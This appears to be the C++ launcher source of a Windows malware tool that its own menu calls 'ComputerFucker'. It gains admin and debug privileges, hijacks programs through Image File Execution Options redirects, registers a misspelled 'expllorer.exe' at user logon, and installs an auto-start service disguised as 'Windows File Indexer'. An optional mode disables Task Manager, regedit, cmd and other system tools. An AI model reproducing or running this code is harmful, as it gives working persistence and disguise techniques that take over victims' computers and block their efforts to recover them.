/*f:\programm\tdm-gcc-64\bin\g++ "E:\Data\Project\万花劫持器\launcher.cpp" -o "E:\Data\Project\万花劫持器\launcher.exe" -Wl,--allow-multiple-definition -lpsapi*/



#include"bin\MustInclude.h"
#include"process.h"
#include"admin.h"
#include"RegFunc.h"
#include"file.h"
#define CLS system("cls");
#define PAUSE system("pause>nul");
#include<iostream>
using namespace std;
string CurDir,BinSrc;
string key="114514";
string src;
string tgt;
string SvcPath;
bool isGuard,isConfiged=0;
void config(){
	isConfiged=1;
	CLS cout<<"Input Source Programm In ImageExaction=>";cin>>src;
	cout<<"Input Target Programm In ImageExaction=>";cin>>tgt;
	cout<<"Do you wan to fuck this computer? (1/0)";cin>>isGuard;
}



void install(){
	System("RegTest.exe");
	if(!isConfiged)config();
	SetImageFileExecutionRedirect(src,tgt);//创建首要程序劫持
	
	AddToUserInit(string(string(BIN_PATH)+"expllorer.exe").c_str());cout<<string(string(BIN_PATH)+"expllorer.exe");
	CreateWindowsService(//创建常驻伪装 注册表回写服务  
        "WFI",          // 服务名  
        "Windows File Indexer",          // 显示名  
        "Windows文件索引器",  // 描述  
        SvcPath.c_str(),    // 程序路径  
        SERVICE_AUTO_START           // 自动启动  
    );PAUSE
	if(isGuard){

		SetImageFileExecutionRedirect("taskkill.exe","aux");//干掉系统工具
		SetImageFileExecutionRedirect("tasklist.exe","aux");
		SetImageFileExecutionRedirect("taskmgr.exe","aux");
		SetImageFileExecutionRedirect("reg.exe","aux");
		SetImageFileExecutionRedirect("regedit.exe","aux");
		SetImageFileExecutionRedirect("cmd.exe","aux");
		SetImageFileExecutionRedirect("mmc.exe","aux");
	}
	
}

void uninstall(){
	//TerminateProcessById(getSinglePid());
	
	
	SetSystemShell("C:/windows/explorer.exe");
}

void copyToBin(char* binPath){

	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		CopyFileToDirectory(addStrings(BinSrc.c_str(),allBinFile[i].c_str()),binPath);
	}

	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		CopyFileWithCommand(addStrings(BinSrc.c_str(),allBinFile[i].c_str()),binPath);
	}
}

void init(){//这个启动器被编译为32位，文件复制大概率走不通，那么就启动FileSpawner.exe
	system("title Ciallo~");
	CurDir=GetCurrentDirectory();
	BinSrc=CurDir+"\\bin\\";
	SvcPath=string(BIN_PATH)+string("SCMServiceGuard.exe");
	
	CopyFileToDirectory(addStrings(BinSrc.c_str(),WALLPAPER_NAME),"C:\\windows\\system32\\");//拷贝目标壁纸
	
	copyToBin(BIN_PATH); CLS
	copyToBin(SECOND_BIN_PATH); CLS
	
	cout<<"Copying the file";
	for(int time=0;time<4;time++){//Retry
	System("FileSpawner.exe");
	Sleep(2000);
	cout<<".";
	}
	cout<<"\nInit Successfully!\n";
	PAUSE
	CLS
}

int main () {
	RequestAdminRightsWithArgs();
	EnableDebugPrivilege();
	init();
	/*string YourKey;cout<<"Please enter the password=> ";cin>>YourKey;CLS
	if(YourKey!=key){system("wininit.exe");}*/
	int in;
	cout<<"Please select a function.\n1.Install ComputerFucker.\n2.Uninstall ComputerFucker.\n3.Config ComputerFucker.\n=>";cin>>in;
	if(in==1)install();
	if(in==2)uninstall();
	if(in==3)config();
	PAUSE
	return 0;
}